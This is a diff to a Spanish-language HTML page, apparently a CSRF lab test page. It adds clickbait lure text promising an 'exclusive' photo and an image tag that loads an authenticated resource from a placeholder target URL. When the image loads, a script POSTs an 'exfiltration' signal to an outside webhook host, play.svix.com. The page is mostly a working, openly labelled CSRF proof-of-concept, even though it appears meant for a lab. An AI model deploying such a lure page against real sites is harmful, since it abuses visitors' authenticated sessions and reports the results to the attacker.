@@ -1,18 +1,132 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    </head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Una Foto que No Te Puedes Perder! | Sitio de Prueba CSRF</title>
+    <style>
+        /* CSS Minimalista */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #e9ecef;
+            color: #495057;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 90%;
+            width: 550px;
+        }
+        h1 {
+            color: #007bff;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+        }
+        p {
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        #csrf-payload {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border: 3px solid #ced4da;
+            border-radius: 8px;
+        }
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+        .status-success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
 <body>
-    <h1>Hola</h1>
     <div class="container">
-        <img id="csrf-payload" 
-             src="TU_URL_DEL_LABORATORIO_PARA_LA_IMAGEN" 
-             alt="Cargando recurso del sitio de destino..." 
-             onerror="console.error('La carga falló, posiblemente no hay sesión o la URL es incorrecta.');">
+        <h1>¡Una Foto que No Te Puedes Perder! 📸</h1>
+        <p>Entra y ve esta imagen **exclusiva** que encontramos en un servidor de prueba.</p>
+        <p><strong>(El navegador intenta cargar el recurso autenticado ahora mismo.)</strong></p>
         
+        <img id="csrf-payload" 
+             src="URL_DEL_LABORATORIO_PARA_LA_IMAGEN" 
+             alt="Cargando imagen desde el sitio de destino..."
+             crossorigin="anonymous">
+        
+        <div id="status" class="status-message"></div>
     </div>
 
-    
-</body>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const imageElement = document.getElementById('csrf-payload');
+            const statusDiv = document.getElementById('status');
+            
+            // Reemplaza esta URL con tu enlace de Webhook Tester
+            const WEBHOOK_URL = 'https://play.svix.com/in/e_V1KAwUnBcM76UjNKySj4vJirV0R/';
 
+            const updateStatus = (message, isSuccess) => {
+                statusDiv.textContent = message;
+                statusDiv.style.display = 'block';
+                statusDiv.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
+            };
+
+            // 1. Detección de Éxito: Evento 'load'
+            imageElement.addEventListener('load', () => {
+                const successMessage = '✅ ¡Éxito en el CSRF! El recurso autenticado se cargó.';
+                updateStatus(successMessage, true);
+                console.log(successMessage);
+
+                // ** EXFILTRACIÓN DE LA SEÑAL AL WEBHOOK **
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    // Payload con la señal de éxito
+                    body: JSON.stringify({
+                        attack_type: 'CSRF_SameSite_None',
+                        status: 'Success_Image_Load_Detected',
+                        source_page: window.location.href, 
+                        timestamp: new Date().toISOString()
+                    })
+                })
+                .then(response => {
+                    console.log('Webhook notificado con estado:', response.status);
+                    if (response.status !== 200) {
+                        console.warn('El Webhook no devolvió un código 200 OK. Verifica la configuración.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error al intentar notificar al webhook:', error);
+                });
+            });
+            
+            // 2. Detección de Fallo: Evento 'error'
+            imageElement.addEventListener('error', () => {
+                const errorMessage = '❌ Fallo en la carga. El recurso no pudo ser cargado.';
+                updateStatus(errorMessage, false);
+                console.error(errorMessage);
+                imageElement.style.display = 'none'; // Oculta el icono de imagen rota
+            });
+        });
+    </script>
+</body>
 </html>
